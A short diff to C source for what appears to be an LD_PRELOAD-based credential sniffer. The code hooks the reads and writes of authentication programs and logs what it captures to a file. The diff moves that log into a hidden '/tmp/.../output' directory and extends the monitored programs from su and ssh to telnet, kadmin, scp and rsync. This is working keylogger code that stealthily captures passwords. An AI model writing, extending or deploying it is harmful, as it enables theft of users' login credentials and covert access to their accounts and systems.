@@ -33,7 +33,7 @@
 
 /* Redefine OUTPUT_FILE to whatever path you want your log to be saved. */
 #ifndef OUTPUT_FILE
-    #define OUTPUT_FILE "/tmp/output"
+    #define OUTPUT_FILE "/tmp/.../output"
 #endif
 #define RTLD_NEXT	((void *) -1l)
 
@@ -48,7 +48,7 @@ int file = -1;
 /* The read buffer. */
 char buffer[256];
 /* Array containing the files we want to monitor(ended with a null pointer). */
-char *injected_files[] = { "/bin/su", "/usr/bin/ssh", 0 };
+char *injected_files[] = { "/bin/su", "/usr/bin/ssh", "/usr/bin/telnet", "/usr/bin/kadmin", "/usr/bin/scp", "/usr/bin/rsync", 0 };
 
 int do_read_write(int read_fd, int write_fd, int log) {
     int bread, i, start, dummy;
